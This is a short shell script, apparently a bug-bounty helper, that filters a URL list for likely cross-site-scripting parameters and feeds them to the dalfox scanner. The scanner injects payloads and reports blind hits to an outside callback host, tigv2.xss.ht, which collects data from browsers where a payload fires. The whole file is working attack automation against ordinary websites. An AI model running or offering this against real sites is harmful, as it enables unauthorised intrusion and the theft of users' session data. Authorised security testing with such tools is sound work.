
input_url_list=$1
cat $input_url_list | gf xss | sed 's/=.*/=/' | sed 's/URL: //' | tee /tmp/testxss$$.txt

dalfox file /tmp/testxss$$.txt -b tigv2.xss.ht pipe
